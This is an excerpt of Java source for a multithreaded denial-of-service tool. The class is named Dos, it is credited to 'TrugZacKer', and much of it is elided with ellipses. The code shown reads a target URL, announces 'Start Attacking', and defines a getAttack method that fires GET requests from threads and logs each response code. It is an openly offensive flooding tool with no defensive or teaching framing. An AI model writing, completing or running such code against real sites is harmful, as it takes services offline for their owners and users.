...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Start Attacking: " + url);

        String[] SUrl = url.split("://");

        System.out.println("~> Check URL Connection");
        ...
        System.out.println("Setting DDoS By:لوTrugZacKer");
        ...
        System.out.println("Finished hardware");
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("GET The Attack Is Done: " + responseCode +   "Thread: "  + this.seq);
    }
